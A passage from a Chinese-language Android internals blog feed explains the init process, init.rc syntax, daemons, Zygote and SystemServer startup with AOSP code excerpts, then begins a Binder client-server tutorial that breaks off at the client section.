class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="comment">//非充电模式下，执行rc文件中触发器为late-init的语句</span></div><div class="line">        am.QueueEventTrigger(<span class="string">"late-init"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// Run all property triggers based on current state of the properties.</span></div><div class="line">    <span class="comment">// 创建queue_property_triggers动作并且添加到action vector和trigger_queue_中</span></div><div class="line">    am.QueueBuiltinAction(queue_property_triggers_action, <span class="string">"queue_property_triggers"</span>);</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (!waiting_for_exec) &#123;</div><div class="line">            am.ExecuteOneCommand();</div><div class="line">            <span class="comment">// 重启一些关键进程</span></div><div class="line">            restart_processes();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">int</span> timeout = <span class="number">-1</span>;</div><div class="line">        <span class="keyword">if</span> (process_needs_restart) &#123;</div><div class="line">            timeout = (process_needs_restart - gettime()) * <span class="number">1000</span>;</div><div class="line">            <span class="keyword">if</span> (timeout &lt; <span class="number">0</span>)</div><div class="line">                timeout = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (am.HasMoreCommands()) &#123;</div><div class="line">            timeout = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        bootchart_sample(&amp;timeout);</div><div class="line"></div><div class="line">        epoll_event ev;</div><div class="line">        <span class="comment">//循环 等待事件发生</span></div><div class="line">        <span class="keyword">int</span> nr = TEMP_FAILURE_RETRY(epoll_wait(epoll_fd, &amp;ev, <span class="number">1</span>, timeout));</div><div class="line">        <span class="keyword">if</span> (nr == <span class="number">-1</span>) &#123;</div><div class="line">            ERROR(<span class="string">"epoll_wait failed: %s\n"</span>, strerror(errno));</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nr == <span class="number">1</span>) &#123;</div><div class="line">            ((<span class="keyword">void</span> (*)()) ev.data.ptr)();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>可以看到，init进程主要以下功能：</strong></p>
<ol>
<li>是挂载tmpfs, devpts, proc, sysfs<code>文件系统</code>。</li>
<li>是运行init.rc脚本，init将会解析init.rc，并且执行init.rc中的命令。</li>
<li>当一些关键进程死亡时，重启该进程；</li>
<li>提供Android系统的属性服务</li>
</ol>
<h2 id="3-2-文件系统简介"><a href="#3-2-文件系统简介" class="headerlink" title="3.2 文件系统简介"></a>3.2 文件系统简介</h2><p><strong> 1. tmpfs文件系统</strong></p>
<p>tmpfs是一种虚拟内存文件系统，因此它会将所有的文件存储在虚拟内存中，并且tmpfs下的所有内容均为临时性的内容，如果你将tmpfs文件系统卸载后，那么其下的所有的内容将不复存在。tmpfs是一个独立的文件系统，不是块设备，只要挂接，立即就可以使用。</p>
<p><strong> 2. devpts文件系统 </strong>  </p>
<p>devpts文件系统为伪终端提供了一个标准接口，它的标准挂接点是/dev/pts。只要pty的主复合设备/dev/ptmx被打开，就会在/dev/pts下动态的创建一个新的pty设备文件。</p>
<p><strong> 3. proc文件系统 </strong></p>
<p>proc文件系统是一个非常重要的虚拟文件系统，它可以看作是内核内部数据结构的接口，通过它我们可以获得系统的信息，同时也能够在运行时修改特定的内核参数。</p>
<p><strong> 4. sysfs文件系统 </strong></p>
<p>与proc文件系统类似，sysfs文件系统也是一个不占有任何磁盘空间的虚拟文件系统。它通常被挂接在/sys目录下。sysfs文件系统是Linux2.6内核引入的，它把连接在系统上的设备和总线组织成为一个分级的文件，使得它们可以在用户空间存取。</p>
<h1 id="四、init-rc文件和语法"><a href="#四、init-rc文件和语法" class="headerlink" title="四、init rc文件和语法"></a>四、init rc文件和语法</h1><p>init rc文件语法是以行尾单位，以空格间隔的语法，以#开始代表注释行。rc文件主要包含<code>Action</code>、<code>Service</code>、<code>Command</code>、<code>Options</code>，其中对于Action和Service的名称都是唯一的，对于重复的命名视为无效。</p>
<h2 id="4-1-动作Action"><a href="#4-1-动作Action" class="headerlink" title="4.1 动作Action"></a>4.1 动作Action</h2><p>Action： 通过trigger，即以 on开头的语句，决定何时执行相应的service。</p>
<ul>
<li><strong>on early-init</strong>; 在初始化早期阶段触发；</li>
<li><strong>on init</strong>; 在初始化阶段触发；</li>
<li><strong>on late-init</strong>; 在初始化晚期阶段触发；</li>
<li><strong>on boot/charger</strong>： 当系统启动/充电时触发，还包含其他情况，此处不一一列举；</li>
<li><strong>on property:<key>=<value></value></key></strong>: 当属性值满足条件时触发；</li>
</ul>
<h2 id="4-2-服务Service"><a href="#4-2-服务Service" class="headerlink" title="4.2 服务Service"></a>4.2 服务Service</h2><p>服务Service，以service开头，由init进程启动，一般运行于另外一个init的子进程，所以启动service前需要判断对应的可执行文件是否存在。init生成的子进程，定义在rc文件，其中每一个service，<strong>在启动时会通过fork方式生成子进程。</strong></p>
<p>例如： <code>service servicemanager /system/bin/servicemanager</code>代表的是服务名为servicemanager，服务的路径，也就是服务执行操作时运行/system/bin/servicemanager。</p>
<h2 id="4-3-命令Command"><a href="#4-3-命令Command" class="headerlink" title="4.3 命令Command"></a>4.3 命令Command</h2><p>下面列举常用的命令</p>
<ul>
<li>class_start <service_class_name>： 启动属于同一个class的所有服务；</service_class_name></li>
<li>start <service_name>： 启动指定的服务，若已启动则跳过；</service_name></li>
<li>stop <service_name>： 停止正在运行的服务</service_name></li>
<li>setprop <name> <value>：设置属性值</value></name></li>
<li>mkdir <path></path>：创建指定目录</li>
<li>symlink <target> <sym_link>： 创建连接到<target>的<sym_link>符号链接；</sym_link></target></sym_link></target></li>
<li>write <path></path> <string>： 向文件path中写入字符串；</string></li>
<li>exec： fork并执行，会阻塞init进程直到程序完毕；</li>
<li>exprot <name> <name>：设定环境变量；</name></name></li>
<li>loglevel <level>：设置log级别</level></li>
</ul>
<h2 id="4-4-可选操作Options"><a href="#4-4-可选操作Options" class="headerlink" title="4.4 可选操作Options"></a>4.4 可选操作Options</h2><p>Options是Services的可选项，与service配合使用</p>
<ul>
<li>disabled: 不随class自动启动，只有根据service名才启动；</li>
<li>oneshot: service退出后不再重启；</li>
<li>user/group： 设置执行服务的用户/用户组，默认都是root；</li>
<li>class：设置所属的类名，当所属类启动/退出时，服务也启动/停止，默认为default；</li>
<li>onrestart:当服务重启时执行相应命令；</li>
<li>socket: 创建名为/dev/socket/<name>的socket</name></li>
<li>critical: 在规定时间内该service不断重启，则系统会重启并进入恢复模式</li>
</ul>
<p><em>*default:</em> 意味着disabled=false，oneshot=false，critical=false。</p>
<p>所有的Service里面只有servicemanager ，zygote ，surfaceflinger这3个service有onrestart关键字来触发其他service启动过程。</p>
<h1 id="五、Daemon守护进程"><a href="#五、Daemon守护进程" class="headerlink" title="五、Daemon守护进程"></a>五、Daemon守护进程</h1><p>init.rc会启动一些daemon进程，比如ueventd, adbd, servicemanager, vold, netd, debuggerd等。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">service ueventd /sbin/ueventd  </div><div class="line">    class core  </div><div class="line">    critical  </div><div class="line">  </div><div class="line">service console /system/bin/sh  </div><div class="line">    class core  </div><div class="line">    console  </div><div class="line">    disabled  </div><div class="line">    user shell  </div><div class="line">    group log  </div><div class="line">  </div><div class="line">service adbd /sbin/adbd  </div><div class="line">    class core  </div><div class="line">    disabled  </div><div class="line">      </div><div class="line">service servicemanager /system/bin/servicemanager  </div><div class="line">    class core  </div><div class="line">    user system  </div><div class="line">    group system  </div><div class="line">    critical  </div><div class="line">    onrestart restart zygote  </div><div class="line">    onrestart restart media  </div><div class="line">    onrestart restart surfaceflinger  </div><div class="line">    onrestart restart drm  </div><div class="line">  </div><div class="line">service vold /system/bin/vold  </div><div class="line">    class core  </div><div class="line">    socket vold stream 0660 root mount  </div><div class="line">    ioprio be 2  </div><div class="line">  </div><div class="line">service netd /system/bin/netd  </div><div class="line">    class main  </div><div class="line">    socket netd stream 0660 root system  </div><div class="line">    socket dnsproxyd stream 0660 root inet  </div><div class="line">    socket mdns stream 0660 root system  </div><div class="line">  </div><div class="line">service debuggerd /system/bin/debuggerd  </div><div class="line">    class main</div></pre></td></tr></table></figure>
<h1 id="六、ServiceManager"><a href="#六、ServiceManager" class="headerlink" title="六、ServiceManager"></a>六、ServiceManager</h1><p>ServiceManager也是守护进程，它是android的服务大管家，是一个很重要的服务：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">//servicemanager可触发healthd、zygote、media、surfaceflinger、drm重启</div><div class="line">service servicemanager /system/bin/servicemanager</div><div class="line">    class core</div><div class="line">    user system</div><div class="line">    group system</div><div class="line">    critical</div><div class="line">    onrestart restart healthd</div><div class="line">    onrestart restart zygote</div><div class="line">    onrestart restart media</div><div class="line">    onrestart restart surfaceflinger</div><div class="line">    onrestart restart drm</div></pre></td></tr></table></figure>
<p><code>service servicemanager /system/bin/servicemanager</code>表示服务名为servicemanager，服务运行的时候会执行<code>/system/bin/servicemanager</code>。</p>
<h1 id="七、Zygote"><a href="#七、Zygote" class="headerlink" title="七、Zygote"></a>七、Zygote</h1><p>Zygote是第一个Java进程，并且<strong>是所有java进程的父进程</strong>。在init.zygote32.rc文件中，zygote服务定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//zygote可触发media、netd重启</span></div><div class="line">service zygote /system/bin/app_process -Xzygote /system/bin --zygote --start-system-server</div><div class="line">    <span class="keyword">class</span> main</div><div class="line">    socket zygote stream <span class="number">660</span> root system</div><div class="line">    onrestart write /sys/android_power/request_state wake</div><div class="line">    onrestart write /sys/power/state on</div><div class="line">    onrestart restart media</div><div class="line">    onrestart restart netd</div></pre></td></tr></table></figure>
<p><strong>Zygote入口和相关类：</strong></p>
<blockquote>
<p>/frameworks/base/cmds/app_process/App_main.cpp （内含AppRuntime类）<br>/frameworks/base/core/jni/AndroidRuntime.cpp<br>/frameworks/base/core/java/com/android/internal/os/ZygoteInit.java<br>/frameworks/base/core/java/com/android/internal/os/Zygote.java<br>/frameworks/base/core/java/android/net/LocalServerSocket.java<br>/system/core/libutils/Threads.cpp</p>
</blockquote>
<p>解释下第一行参数：</p>
<ul>
<li>zygote : 服务名</li>
<li>systen/bin/app_process : zygote所对应的可执行文件是，通过调用pid =fork()创建子进程</li>
<li>剩下的四个参数是zygote进程的<code>启动参数</code>，其中最后一个参数<code>--start-system-server</code>是表示zygote进程启动完成后，马上将system进程启动起来。</li>
</ul>
<p>zygote启动过程调用堆栈：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">App_main.main()</div><div class="line">    AndroidRuntime.start()</div><div class="line">        StartVM()</div><div class="line">        StartReg()</div><div class="line">        ZygoteInit.main()</div><div class="line">            ResgisterZygoteSocket()</div><div class="line">            preload()</div><div class="line">            startSystemServer()</div><div class="line">            runSelectLoop()</div></pre></td></tr></table></figure>
<p>zygote进程的主要工作如下：</p>
<ol>
<li>解析init.zygote.rc中的参数，创建AppRuntime并调用AppRuntime.start()方法；</li>
<li>调用AndroidRuntime的startVM()方法创建虚拟机，再调用startReg()注册JNI函数；</li>
<li>通过JNI方式调用ZygoteInit.main()，第一次进入Java世界；</li>
<li>registerZygoteSocket()建立socket通道，zygote作为通信的服务端，用于响应客户端请求；</li>
<li>preload()预加载通用类、drawable和color资源、openGL以及共享库以及WebView，用于提高ap启动效率；</li>
<li>zygote完毕大部分工作，接下来再通过startSystemServer()，fork得力帮手system_server进程，也是上层framework的运行载体。</li>
<li>zygote功成身退，调用runSelectLoop()，随时待命，当接收到请求创建新进程请求时立即唤醒并执行相应工作。</li>
</ol>
<h1 id="八、system-server"><a href="#八、system-server" class="headerlink" title="八、system_server"></a>八、system_server</h1><p>上面提到Zygote启动过程中会调用startSystemServer()，可知startSystemServer()函数是system_server启动流程的起点， system_server相关类函数如下：</p>
<blockquote>
<p>/frameworks/base/core/java/android/app/ActivityThread.java<br>/frameworks/base/core/java/android/app/LoadedApk.java<br>/frameworks/base/core/java/android/app/ContextImpl.java<br>/frameworks/base/core/java/com/android/server/LocalServices.java<br>/frameworks/base/services/java/com/android/server/SystemServer.java<br>/frameworks/base/services/core/java/com/android/server/SystemServiceManager.java<br>/frameworks/base/services/core/java/com/android/server/ServiceThread.java<br>/frameworks/base/services/core/java/com/android/server/pm/Installer.java<br>/frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</p>
</blockquote>
<p><strong>启动流程图如下：</strong></p>
<p><img src="/img/archives/system_server.jpg" alt="system_server.png"></p>
<p>进入到SystemServer.main后，调用堆栈如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">SystemServer.main</div><div class="line">    SystemServer.run</div><div class="line">        createSystemContext</div><div class="line">            ActivityThread.systemMain</div><div class="line">                ActivityThread.attach</div><div class="line">                    LoadedApk.makeApplication</div><div class="line">            ActivityThread.getSystemContext</div><div class="line">                ContextImpl.createSystemContext</div><div class="line">        startBootstrapServices();//启动引导服务</div><div class="line">        startCoreServices();     // 启动核心服务</div><div class="line">        startOtherServices();    // 启动其他服务</div><div class="line">        Looper.loop();</div></pre></td></tr></table></figure></p>
<p>有兴趣的读者可以跟着follow源码一步步展开，由于篇幅所限，只做总结归纳，system_server最主要的工作就是启动系统服务。 通过startBootstrapServices(), startCoreServices(), startOtherServices()3个方法。</p>
<h2 id="8-1-startBootstrapServices"><a href="#8-1-startBootstrapServices" class="headerlink" title="8.1 startBootstrapServices();"></a>8.1 startBootstrapServices();</h2><p>[ SystemServer.java ] 启动引导服务</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startBootstrapServices</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="comment">//阻塞等待与installd建立socket通道</span></div><div class="line">    Installer installer = mSystemServiceManager.startService(Installer.class);</div><div class="line"></div><div class="line">    <span class="comment">//启动服务ActivityManagerService</span></div><div class="line">    mActivityManagerService = mSystemServiceManager.startService(</div><div class="line">            ActivityManagerService.Lifecycle.class).getService();</div><div class="line">    mActivityManagerService.setSystemServiceManager(mSystemServiceManager);</div><div class="line">    mActivityManagerService.setInstaller(installer);</div><div class="line"></div><div class="line">    <span class="comment">//启动服务PowerManagerService</span></div><div class="line">    mPowerManagerService = mSystemServiceManager.startService(PowerManagerService.class);</div><div class="line"></div><div class="line">    <span class="comment">//初始化power management</span></div><div class="line">    mActivityManagerService.initPowerManagement();</div><div class="line"></div><div class="line">    <span class="comment">//启动服务LightsService</span></div><div class="line">    mSystemServiceManager.startService(LightsService.class);</div><div class="line"></div><div class="line">    <span class="comment">//启动服务DisplayManagerService</span></div><div class="line">    mDisplayManagerService = mSystemServiceManager.startService(DisplayManagerService.class);</div><div class="line"></div><div class="line">    <span class="comment">//Phase100: 在初始化package manager之前，需要默认的显示.</span></div><div class="line">    mSystemServiceManager.startBootPhase(SystemService.PHASE_WAIT_FOR_DEFAULT_DISPLAY);</div><div class="line"></div><div class="line">    <span class="comment">//当设备正在加密时，仅运行核心</span></div><div class="line">    String cryptState = SystemProperties.get(<span class="string">"vold.decrypt"</span>);</div><div class="line">    <span class="keyword">if</span> (ENCRYPTING_STATE.equals(cryptState)) &#123;</div><div class="line">        mOnlyCore = <span class="keyword">true</span>;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ENCRYPTED_STATE.equals(cryptState)) &#123;</div><div class="line">        mOnlyCore = <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//启动服务PackageManagerService</span></div><div class="line">    mPackageManagerService = PackageManagerService.main(mSystemContext, installer,</div><div class="line">            mFactoryTestMode != FactoryTest.FACTORY_TEST_OFF, mOnlyCore);</div><div class="line">    mFirstBoot = mPackageManagerService.isFirstBoot();</div><div class="line">    mPackageManager = mSystemContext.getPackageManager();</div><div class="line"></div><div class="line">    <span class="comment">//启动服务UserManagerService，新建目录/data/user/</span></div><div class="line">    ServiceManager.addService(Context.USER_SERVICE, UserManagerService.getInstance());</div><div class="line"></div><div class="line">    AttributeCache.init(mSystemContext);</div><div class="line"></div><div class="line">    <span class="comment">//设置AMS</span></div><div class="line">    mActivityManagerService.setSystemProcess();</div><div class="line"></div><div class="line">    <span class="comment">//启动传感器服务</span></div><div class="line">    startSensorService();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该方法所创建的服务：<br><code>ActivityManagerService</code>, <code>PowerManagerService</code>, <code>LightsService</code>, <code>DisplayManagerService</code>， <code>PackageManagerService</code>， <code>UserManagerService</code>， <code>SensorService</code>服务。</p>
<h2 id="8-2-startCoreServices"><a href="#8-2-startCoreServices" class="headerlink" title="8.2 startCoreServices();"></a>8.2 startCoreServices();</h2><p>[ SystemServer.java ]  启动核心服务</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startCoreServices</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="comment">//启动服务BatteryService，用于统计电池电量，需要LightService.</span></div><div class="line">    mSystemServiceManager.startService(BatteryService.class);</div><div class="line"></div><div class="line">    <span class="comment">//启动服务UsageStatsService，用于统计应用使用情况</span></div><div class="line">    mSystemServiceManager.startService(UsageStatsService.class);</div><div class="line">    mActivityManagerService.setUsageStatsManager(</div><div class="line">            LocalServices.getService(UsageStatsManagerInternal.class));</div><div class="line"></div><div class="line">    mPackageManagerService.getUsageStatsIfNoPackageUsageInfo();</div><div class="line"></div><div class="line">    <span class="comment">//启动服务WebViewUpdateService</span></div><div class="line">    mSystemServiceManager.startService(WebViewUpdateService.class);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>启动服务<code>BatteryService</code>，<code>UsageStatsService</code>，<code>WebViewUpdateService</code>。</p>
<h2 id="8-3-startOtherServices"><a href="#8-3-startOtherServices" class="headerlink" title="8.3 startOtherServices()"></a>8.3 startOtherServices()</h2><p>[ SystemServer.java ]  启动其他服务</p>
<p>该方法比较长，有近千行代码，逻辑很简单，主要是启动一系列的服务:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startOtherServices</span><span class="params">()</span> </span>&#123;</div><div class="line">        ...</div><div class="line">        SystemConfig.getInstance();</div><div class="line">        mContentResolver = context.getContentResolver(); <span class="comment">// resolver</span></div><div class="line">        ...</div><div class="line">        mActivityManagerService.installSystemProviders(); <span class="comment">//provider</span></div><div class="line">        mSystemServiceManager.startService(AlarmManagerService.class); <span class="comment">// alarm</span></div><div class="line">        <span class="comment">// watchdog</span></div><div class="line">        watchdog.init(context, mActivityManagerService); </div><div class="line">        inputManager = <span class="keyword">new</span> InputManagerService(context); <span class="comment">// input</span></div><div class="line">        wm = WindowManagerService.main(...); <span class="comment">// window</span></div><div class="line">        inputManager.start();  <span class="comment">//启动input</span></div><div class="line">        mDisplayManagerService.windowManagerAndInputReady();</div><div class="line">        ...</div><div class="line">        mSystemServiceManager.startService(MOUNT_SERVICE_CLASS); <span class="comment">// mount</span></div><div class="line">        mPackageManagerService.performBootDexOpt();  <span class="comment">// dexopt操作</span></div><div class="line">        ActivityManagerNative.getDefault().showBootMessage(...); <span class="comment">//显示启动界面</span></div><div class="line">        ...</div><div class="line">        statusBar = <span class="keyword">new</span> StatusBarManagerService(context, wm); <span class="comment">//statusBar</span></div><div class="line">        <span class="comment">//dropbox</span></div><div class="line">        ServiceManager.addService(Context.DROPBOX_SERVICE,</div><div class="line">                    <span class="keyword">new</span> DropBoxManagerService(context, <span class="keyword">new</span> File(<span class="string">"/data/system/dropbox"</span>)));</div><div class="line">         mSystemServiceManager.startService(JobSchedulerService.class); <span class="comment">//JobScheduler</span></div><div class="line">         lockSettings.systemReady(); <span class="comment">//lockSettings</span></div><div class="line"></div><div class="line">        <span class="comment">//phase480 和phase500</span></div><div class="line">        mSystemServiceManager.startBootPhase(SystemService.PHASE_LOCK_SETTINGS_READY);</div><div class="line">        mSystemServiceManager.startBootPhase(SystemService.PHASE_SYSTEM_SERVICES_READY);</div><div class="line">        ...</div><div class="line">        <span class="comment">// 准备好window, power, package, display服务</span></div><div class="line">        wm.systemReady();</div><div class="line">        mPowerManagerService.systemReady(...);</div><div class="line">        mPackageManagerService.systemReady();</div><div class="line">        mDisplayManagerService.systemReady(...);</div><div class="line">        <span class="comment">//见下面分析</span></div><div class="line">        mActivityManagerService.systemReady(<span class="keyword">new</span> Runnable() &#123;...&#125;);</div></pre></td></tr></table></figure>
<p>其中AMS.systemReady()的大致过程如下:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ActivityManagerService</span> <span class="keyword">extends</span> <span class="title">ActivityManagerNative</span></span></div><div class="line">    <span class="keyword">implements</span> <span class="title">Watchdog</span>.<span class="title">Monitor</span>, <span class="title">BatteryStatsImpl</span>.<span class="title">BatteryCallback</span> &#123;</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">systemReady</span><span class="params">(<span class="keyword">final</span> Runnable goingCallback)</span> </span>&#123;</div><div class="line">        ... <span class="comment">//update相关</span></div><div class="line">        mSystemReady = <span class="keyword">true</span>;</div><div class="line">        </div><div class="line">        <span class="comment">//杀掉所有非persistent进程</span></div><div class="line">        removeProcessLocked(proc, <span class="keyword">true</span>, <span class="keyword">false</span>, <span class="string">"system update done"</span>);</div><div class="line">        mProcessesReady = <span class="keyword">true</span>; </div><div class="line"></div><div class="line">        goingCallback.run();  <span class="comment">//[见小节1.6.2]</span></div><div class="line">        </div><div class="line">        addAppLocked(info, <span class="keyword">false</span>, <span class="keyword">null</span>); <span class="comment">//启动所有的persistent进程</span></div><div class="line">        mBooting = <span class="keyword">true</span>; </div><div class="line">        </div><div class="line">        <span class="comment">//启动home</span></div><div class="line">        startHomeActivityLocked(mCurrentUserId, <span class="string">"systemReady"</span>); </div><div class="line">        <span class="comment">//恢复栈顶的Activity</span></div><div class="line">        mStackSupervisor.resumeTopActivitiesLocked();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>ActivityManagerService的systemReady方法，在该方法里会启动系统界面以及Home程序。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文介绍android的启动流程。&lt;/p&gt;
    
    </summary>
    
      <category term="Android进阶" scheme="https://maoao530.github.io/categories/Android%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="Android启动" scheme="https://maoao530.github.io/tags/Android%E5%90%AF%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>Binder实用指南（二） - 实战篇</title>
    <link href="https://maoao530.github.io/2016/12/25/android-binder-02/"/>
    <id>https://maoao530.github.io/2016/12/25/android-binder-02/</id>
    <published>2016-12-25T13:45:33.000Z</published>
    <updated>2017-01-31T05:48:11.003Z</updated>
    
    <content type="html"><![CDATA[<p>本章的内容主要说明如何在JavaFramework层和Native层自定义Client-Server组件，并且使用Binder进行通信。</p>
<a id="more"></a>
<h1 id="一、Native-Binder"><a href="#一、Native-Binder" class="headerlink" title="一、Native Binder"></a>一、Native Binder</h1><p>源码目录结构:</p>
<blockquote>
<p>alps/frameworks/native/cmds/NativeBinderDemo/</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">|-NativeBinderDemo</div><div class="line">|---ClientDemo.cpp: 客户端程序</div><div class="line">|---ServerDemo.cpp：服务端程序</div><div class="line">|---IMyService.h：自定义的MyService服务的头文件</div><div class="line">|---IMyService.cpp：自定义的MyService服务</div><div class="line">|---Android.mk：源码build文件</div></pre></td></tr></table></figure>
<h2 id="1-1-服务端"><a href="#1-1-服务端" class="headerlink" title="1.1 服务端"></a>1.1 服务端</h2><blockquote>
<p>alps/frameworks/native/cmds/NativeBinderDemo/ServerDemo.cpp</p>
</blockquote>
<p>获取ServiceManager，注册service.myservice服务到ServiceManager，启动服务。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"IMyService.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    sp &lt; IServiceManager &gt; sm = defaultServiceManager(); <span class="comment">//获取service manager引用</span></div><div class="line">    sm-&gt;addService(String16(<span class="string">"service.myservice"</span>), <span class="keyword">new</span> BnMyService()); <span class="comment">//注册名为"service.myservice"的服务到service manager</span></div><div class="line">    ProcessState::self()-&gt;startThreadPool(); <span class="comment">//启动线程池</span></div><div class="line">    IPCThreadState::self()-&gt;joinThreadPool(); <span class="comment">//把主线程加入线程池</span></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1-2-客户端"><a href="#1-2-客户端" class="headerlink" title="1.2 客户端"></a>1.2 客户端</h2><blockquote>
<p>alps/frameworks/native/cmds/NativeBinderDemo/ClientDemo.cpp</p>
</blockquote>
<p>获取ServiceManager，拿到service.myservice服务，再进行类型转换成IMyService，最后调用远程方法sayHello()</p>
